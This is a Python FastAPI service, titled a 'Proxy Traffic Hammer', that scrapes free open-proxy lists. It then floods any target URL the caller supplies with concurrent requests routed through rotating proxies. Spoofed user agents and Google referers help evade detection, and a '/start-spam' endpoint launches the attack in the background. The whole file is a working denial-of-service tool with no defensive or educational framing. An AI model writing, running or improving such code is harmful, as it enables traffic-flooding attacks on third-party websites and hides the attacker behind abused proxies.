import asyncio
import random
import time
from itertools import cycle
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse
import aiohttp
import httpx
from bs4 import BeautifulSoup

app = FastAPI(title="Proxy Traffic Hammer - Railway Edition")

async def scrape_open_proxies() -> list:
    proxies = []
    sources = [
        "https://www.sslproxies.org/",
        "https://free-proxy-list.net/",
        "https://www.us-proxy.org/",
        # Add more aggregator URLs as needed from your recon
    ]
    headers = {'User-Agent': 'Mozilla/5.0'}
    async with aiohttp.ClientSession(headers=headers) as session:
        for url in sources:
            try:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        soup = BeautifulSoup(await resp.text(), 'html.parser')
                        table = soup.find('table')
                        if table:
                            rows = table.find_all('tr')[1:150]  # Top fresh ones
                            for row in rows:
                                cols = row.find_all('td')
                                if len(cols) > 1:
                                    ip = cols[0].text.strip()
                                    port = cols[1].text.strip()
                                    if ip and port:
                                        proxies.append(f"http://{ip}:{port}")
            except Exception as e:
                pass  # Silent on flaky sources
    # Dedupe and shuffle
    proxies = list(set(proxies))
    random.shuffle(proxies)
    return proxies[:500]  # Cap for sanity

async def hammer_url(target_url: str, num_workers: int = 50, requests_per_worker: int = 80, delay: float = 0.08):
    proxies = await scrape_open_proxies()
    if not proxies:
        print("No open proxies scraped - aborting run.")
        return
    
    proxy_cycle = cycle(proxies)
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        # Expand list for variety
    ]
    
    async def worker(proxy_cyc):
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=12)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for _ in range(requests_per_worker):
                proxy = next(proxy_cyc)
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Referer': 'https://www.google.com/search?q=' + target_url.split('//')[-1],
                    'Cache-Control': 'no-cache'
                }
                try:
                    async with session.get(target_url, proxy=proxy, headers=headers) as response:
                        status = response.status
                        print(f"Proxy {proxy} -> {status} on {target_url}")
                except Exception:
                    pass  # Burn through dead ones
                await asyncio.sleep(delay)
    
    tasks = [asyncio.create_task(worker(proxy_cycle)) for _ in range(num_workers)]
    await asyncio.gather(*tasks, return_exceptions=True)

@app.post("/start-spam")
async def start_spam(
    background_tasks: BackgroundTasks,
    target_url: str = Query(..., description="Target site to hammer"),
    workers: int = Query(50, ge=10, le=200),
    reqs_per: int = Query(80, ge=20),
    delay: float = Query(0.08, ge=0.01)
):
    background_tasks.add_task(hammer_url, target_url, workers, reqs_per, delay)
    return JSONResponse({"status": "Spamming initiated with fresh open proxies", "target": target_url, "workers": workers})

@app.get("/health")
async def health():
    return {"status": "Proxy hammer ready on Railway - proxies scraped live"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
